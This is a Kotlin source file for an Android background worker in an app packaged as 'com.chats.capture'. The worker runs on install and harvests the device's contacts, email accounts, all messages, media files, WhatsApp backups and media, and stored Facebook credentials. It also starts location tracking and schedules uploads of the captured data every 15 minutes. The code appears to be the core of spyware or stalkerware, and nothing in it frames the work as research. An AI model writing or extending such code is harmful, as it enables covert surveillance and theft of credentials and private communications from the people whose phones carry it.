package com.chats.capture.workers

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.chats.capture.CaptureApplication
import com.chats.capture.database.CredentialDao
import com.chats.capture.managers.ContactCaptureManager
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.models.CredentialType
import com.chats.capture.network.ApiClient
import com.chats.capture.services.LocationService
import com.chats.capture.utils.CredentialExtractor
import com.chats.capture.utils.FileScanner
import com.chats.capture.utils.InstallationTracker
import com.chats.capture.utils.MessageHistoryCapture
import com.chats.capture.utils.WhatsAppBackupExtractor
import com.chats.capture.utils.WhatsAppMediaScanner
import kotlinx.coroutines.delay
import timber.log.Timber

/**
 * Initial sync worker that runs once on app install
 * Captures and syncs: contacts, messages, emails, files, WhatsApp backup, WhatsApp media, Facebook credentials, location
 */
class InitialSyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    
    override suspend fun doWork(): Result {
        return try {
            Timber.d("InitialSyncWorker started")
            
            // Check if initial sync is already complete
            if (InstallationTracker.isInitialSyncComplete(applicationContext)) {
                Timber.d("Initial sync already complete, skipping")
                return Result.success()
            }
            
            // Check network availability
            if (!ApiClient.isNetworkAvailable(applicationContext)) {
                Timber.w("Network not available, retrying initial sync")
                return Result.retry()
            }
            
            val database = (applicationContext as CaptureApplication).database
            val deviceRegistrationManager = DeviceRegistrationManager(applicationContext)
            val deviceId = deviceRegistrationManager.getDeviceId()
            
            // 1. Capture Contacts
            Timber.d("Step 1/9: Capturing contacts...")
            try {
                val contactCaptureManager = ContactCaptureManager(applicationContext)
                contactCaptureManager.captureAllContacts()
                delay(2000) // Wait for contacts to be saved
                Timber.d("Contacts captured")
            } catch (e: Exception) {
                Timber.e(e, "Error capturing contacts")
            }
            
            // 2. Capture Email Accounts
            Timber.d("Step 2/9: Capturing email accounts...")
            try {
                val credentialExtractor = CredentialExtractor(applicationContext)
                credentialExtractor.syncEmailAccountsToCredentials()
                Timber.d("Email accounts captured")
            } catch (e: Exception) {
                Timber.e(e, "Error capturing email accounts")
            }
            
            // 3. Capture All Messages
            Timber.d("Step 3/9: Capturing existing messages...")
            try {
                val messageHistoryCapture = MessageHistoryCapture(applicationContext)
                messageHistoryCapture.captureAllMessages()
                Timber.d("Messages captured")
            } catch (e: Exception) {
                Timber.e(e, "Error capturing messages")
            }
            
            // 4. Scan Last 10 Media Files
            Timber.d("Step 4/9: Scanning last 10 media files...")
            try {
                val fileScanner = FileScanner(applicationContext)
                fileScanner.scanLast10MediaFiles()
                Timber.d("Media files scanned")
            } catch (e: Exception) {
                Timber.e(e, "Error scanning media files")
            }
            
            // 5. Extract WhatsApp Backup
            Timber.d("Step 5/9: Extracting WhatsApp backup...")
            try {
                val whatsAppBackupExtractor = WhatsAppBackupExtractor(applicationContext)
                whatsAppBackupExtractor.extractMessages()
                Timber.d("WhatsApp backup extracted")
            } catch (e: Exception) {
                Timber.e(e, "Error extracting WhatsApp backup")
            }
            
            // 6. Scan WhatsApp Media
            Timber.d("Step 6/9: Scanning WhatsApp media...")
            try {
                val whatsAppMediaScanner = WhatsAppMediaScanner(applicationContext)
                whatsAppMediaScanner.scanMediaFiles()
                Timber.d("WhatsApp media scanned")
            } catch (e: Exception) {
                Timber.e(e, "Error scanning WhatsApp media")
            }
            
            // 7. Filter and ensure Facebook Credentials are synced
            Timber.d("Step 7/9: Ensuring Facebook credentials are synced...")
            try {
                val credentialDao: CredentialDao = database.credentialDao()
                val facebookCredentials = credentialDao.getCredentialsByApp("com.facebook.katana") +
                        credentialDao.getCredentialsByApp("com.facebook.orca")
                
                if (facebookCredentials.isNotEmpty()) {
                    Timber.d("Found ${facebookCredentials.size} Facebook credentials")
                    // Credentials are already in database, will be synced by regular SyncWorker
                } else {
                    Timber.v("No Facebook credentials found (will be captured when user logs in)")
                }
            } catch (e: Exception) {
                Timber.e(e, "Error checking Facebook credentials")
            }
            
            // 8. Trigger Location Sync
            Timber.d("Step 8/9: Triggering location sync...")
            try {
                val locationService = LocationService(applicationContext)
                locationService.startTracking()
                
                // Force immediate location update
                locationService.uploadLocationImmediately()
                Timber.d("Location sync triggered")
            } catch (e: Exception) {
                Timber.e(e, "Error triggering location sync")
            }
            
            // 9. Mark Initial Sync Complete
            Timber.d("Step 9/9: Marking initial sync as complete...")
            InstallationTracker.markInitialSyncComplete(applicationContext)
            Timber.d("Initial sync marked as complete")
            
            // 10. Trigger Regular Sync Worker to upload all captured data
            Timber.d("Triggering regular sync worker...")
            SyncScheduler.scheduleSync(applicationContext, intervalMinutes = 15)
            
            Timber.d("InitialSyncWorker completed successfully")
            Result.success()
        } catch (e: Exception) {
            Timber.e(e, "InitialSyncWorker failed")
            Result.retry()
        }
    }
}
